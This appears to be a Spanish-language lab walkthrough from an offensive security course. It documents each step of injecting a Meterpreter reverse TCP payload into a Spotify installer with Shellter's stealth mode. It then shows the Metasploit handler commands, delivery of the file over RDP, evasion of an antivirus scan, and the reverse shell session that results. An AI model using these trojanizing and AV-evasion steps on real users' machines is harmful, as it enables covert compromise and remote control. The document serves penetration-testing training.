# Walk: Antivirus Evasion - Evading AV - Automating the Process - VM #1 

## Fecha: 19/06/2025
## Host: Windows
## IP: 192.168.xxx.62
## Objetivo

Use Shellter to inject a Meterpreter reverse shell payload in the Spotify executable, then transfer the binary 
to your Window 11 client VM #1 and ensure that it is not being detected by the antivirus. 
After, set up a Meterpreter listener, run the backdoored Spotify installer, 
and verify that you have obtained an interactive shell. As an additional exercise, attempt to find different executables 
and inject malicious code into them using Shellter.

**Which Shellter option is responsible for restoring the execution flow of the backdoored binary and therefore avoids any unwanted suspicion?**

## Herramientas
1. shellter
2. msfconsole
## Procedimiento y comandos
#### Paso 1: Preparamos el payload con el archivo descargado de los recursos OSCP
> En un directorio en el que tengamos permisos de escritura como **/home**

```bash
┌──(kali㉿kali)-[~]
└─$ shellter                     



        1010101 01   10 0100110 10     01  11001001 0011101 001001
        11      10   01 00      01     01     01    10      11   10
        0010011 1110001 11011   11     10     00    10011   011001
             11 00   10 01      11     01     11    01      01   11
        0010010 11   00 0011010 100111 000111 00    1100011 01   10 v7.2
        www.ShellterProject.com                     Wine Mode



Choose Operation Mode - Auto/Manual (A/M/H): A

PE Target: /home/kali/SpotifyFullWin10-32bit.exe

**********
* Backup *
**********

Backup: Shellter_Backups\SpotifyFullWin10-32bit.exe




********************************
* PE Compatibility Information *
********************************

Minimum Supported Windows OS: 6.0

Note: It refers to the minimum required Windows version for the target
      application to run. This information is taken directly from the
      PE header and might be not always accurate.




******************
* Packed PE Info *
******************

Status: Possibly Not Packed - The EntryPoint is located in the first section!




***********************
* PE Info Elimination *
***********************

Data: Dll Characteristics (Dynamic ImageBase etc...), Digital Signature.

Status: All related information has been eliminated!




****************
* Tracing Mode *                                                                                                                                                                                                  
****************                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Status: Tracing has started! Press CTRL+C to interrupt tracing at any time.

Note: In Auto Mode, Shellter will trace a random number of instructions
      for a maximum time of approximately 30 seconds in native Windows
      hosts and for 60 seconds when used in Wine.



DisASM.dll was created successfully!



Instructions Traced: 18197

Tracing Time Approx: 1.02 mins.



Starting First Stage Filtering...



*************************
* First Stage Filtering *                                                                                                                                                                                         
*************************                                                                                                                                                                                         
                                                                                                                                                                                                                  
Filtering Time Approx: 0.00275 mins.



Enable Stealth Mode? (Y/N/H): 00d8:err:clipboard:convert_selection Timed out waiting for SelectionNotify event
Y                                                                                                                                                                                                                 
                                                                                                                                                                                                                  
************                                                                                                                                                                                                      
* Payloads *                                                                                                                                                                                                      
************                                                                                                                                                                                                      
                                                                                                                                                                                                                  
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec

Use a listed payload or custom? (L/C/H): L
                                                                                                                                                                                                                  
Select payload by index: 1

***************************                                                                                                                                                                                       
* meterpreter_reverse_tcp *                                                                                                                                                                                       
***************************                                                                                                                                                                                       
                                                                                                                                                                                                                  
SET LHOST: 192.168.45.213                                                                                                                                                                                         
                                                                                                                                                                                                                  
SET LPORT: 4444                                                                                                                                                                                                   
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
****************                                                                                                                                                                                                  
* Payload Info *                                                                                                                                                                                                  
****************                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Payload: meterpreter_reverse_tcp                                                                                                                                                                                  

Size: 281 bytes

Reflective Loader: NO

Encoded-Payload Handling: Enabled

Handler Type: IAT



******************
* Encoding Stage *                                                                                                                                                                                                
******************                                                                                                                                                                                                
                                                                                                                                                                                                                  
Encoding Payload: Done!                                                                                                                                                                                           


****************************
* Assembling Decoder Stage *                                                                                                                                                                                      
****************************                                                                                                                                                                                      
                                                                                                                                                                                                                  
Assembling Decoder: Done!                                                                                                                                                                                         


***********************************
* Binding Decoder & Payload Stage *                                                                                                                                                                               
***********************************                                                                                                                                                                               
                                                                                                                                                                                                                  
Status: Obfuscating the Decoder using Thread Context Aware Polymorphic
        code, and binding it with the payload.

Please wait...

Binding: Done!


*********************
* IAT Handler Stage *                                                                                                                                                                                             
*********************                                                                                                                                                                                             
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Fetching IAT Pointers to Memory Manipulation APIs...


0. VirtualAlloc --> N/A
1. VirtualAllocEx --> N/A
2. VirtualProtect --> Not Allowed in Stealth Mode!
3. VirtualProtectEx --> N/A
4. HeapCreate/HeapAlloc --> N/A
5. LoadLibrary/GetProcAddress --> IAT[46b1e8]/IAT[46b098]
6. GetModuleHandle/GetProcAddress --> IAT[46b1c8]/IAT[46b098]
7. CreateFileMapping/MapViewOfFile --> IAT[46b1d4]/IAT[46b1dc]

Using Method --> 6



***************************
* IAT Handler Obfuscation *                                                                                                                                                                                       
***************************                                                                                                                                                                                       
                                                                                                                                                                                                                  
Status: Binding the IAT Handler with Thread Context Aware Polymorphic code.

Please wait...

Code Generation Time Approx: 0.068 seconds.



*************************
* PolyMorphic Junk Code *                                                                                                                                                                                         
*************************                                                                                                                                                                                         
                                                                                                                                                                                                                  
Type: Engine                                                                                                                                                                                                      

Generating: ~456 bytes of PolyMorphic Junk Code

Please wait...

Generated: 456 bytes

Code Generation Time Approx: 0.07 seconds.



Starting Second Stage Filtering...



**************************
* Second Stage Filtering *                                                                                                                                                                                        
**************************                                                                                                                                                                                        
                                                                                                                                                                                                                  
Filtering Time Approx: 0.00288 mins.



*******************
* Injection Stage *                                                                                                                                                                                               
*******************                                                                                                                                                                                               
                                                                                                                                                                                                                  
Virtual Address: 0x412fd6                                                                                                                                                                                         

File Offset: 0x123d6

Section: .text


Adjusting stub pointers to IAT...

Done!


Adjusting Call Instructions Relative Pointers...

Done!


Injection Completed!



*******************
* PE Checksum Fix *                                                                                                                                                                                               
*******************                                                                                                                                                                                               
                                                                                                                                                                                                                  
Status: Valid PE Checksum has been set!

Original Checksum: 0x647592f

Computed Checksum: 0x646ce9f



**********************
* Verification Stage *                                                                                                                                                                                            
**********************                                                                                                                                                                                            
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Info: Shellter will verify that the first instruction of the
      injected code will be reached successfully.
      If polymorphic code has been added, then the first
      instruction refers to that and not to the effective
      payload.
      Max waiting time: 10 seconds.

 Warning!
 If the PE target spawns a child process of itself before
 reaching the injection point, then the injected code will
 be executed in that process. In that case Shellter won't
 have any control over it during this test.
 You know what you are doing, right? ;o)

Injection: Verified!


Press [Enter] to continue...
```
#### Paso 2: Ejecutamos MSF
```msfconsole
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.213
LHOST => 192.168.45.213
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.213:4444
```
#### Paso 3: Nos conectamos por rdp al host victima y copiamos el archivo de nuestro kali al host
```bash
┌──(root㉿kali)-[/home/…/OffSec/15-AntiVirus/03-AV-EvasionPractice/02-Automatic]
└─# xfreerdp /u:"offsec" /p:'lab' /v:192.168.167.62 /dynamic-resolution +clipboard /cert:ignore /drive:home,/home
```

#### Paso 4: Ejecutamos el archivo malicioso luego de ejecutar un escaneo antivirus y no encontrar nada:

> En **MSF**
```msfconsole
[*] Sending stage (177734 bytes) to 192.168.167.62
[*] Meterpreter session 1 opened (192.168.45.213:4444 -> 192.168.167.62:58720) at 2025-06-19 13:37:56 -0300

meterpreter >
```

## Troubleshooting
1. No cambiar permisos root de wine, **IMPORTANTE!** cambiar directorio de ejecucion de shellter
2. Meterpreter inestable.
3. Usar en xfreerdp /drive:<directorio>,/<directorio>

